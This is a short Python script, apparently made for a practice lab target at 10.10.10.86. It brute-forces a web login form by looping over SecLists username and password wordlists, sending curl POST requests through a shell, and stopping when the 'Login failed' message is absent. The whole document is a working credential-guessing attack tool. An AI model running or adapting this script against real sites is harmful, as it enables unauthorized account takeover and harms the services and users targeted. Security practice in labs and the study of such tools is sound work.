# Simple web login bruteforcer that stop after it found a valid username and password

import commands

class colors:
    orange = '\033[93m'
    reset = '\033[0m'
    green = '\033[92m'

user_list = "/usr/share/wordlists/SecLists/Usernames/top-usernames-shortlist.txt"
pass_list = "/usr/share/wordlists/SecLists/Passwords/Common-Credentials/best110.txt"
fail_msg = "Error: Login failed"
url_var = "http://10.10.10.86/login"
data = "username=USER&password=PASS&submit=Login"

with open(user_list) as usernames:
    for user_line in usernames:
        user_line = str(user_line).replace("\n","")

        with open(pass_list) as passwords:
            for pass_line in passwords:
                pass_line = str(pass_line).replace("\n","")
                d = str(data).replace("USER",user_line).replace("PASS",str(pass_line))
                output = commands.getoutput('curl -X POST http://10.10.10.86/login -d "' + str(d)  + '"')
                # print output
                if fail_msg in str(output):
                    print("[" + colors.orange + "-" + colors.reset + "] Trying " + str(user_line) + ":" + str(pass_line))
                    pass
                else:
                    print("[" + colors.green + "+" + colors.reset + "] Found valid credentials " + str(user_line) + ":" + str(pass_line))
                    exit(1)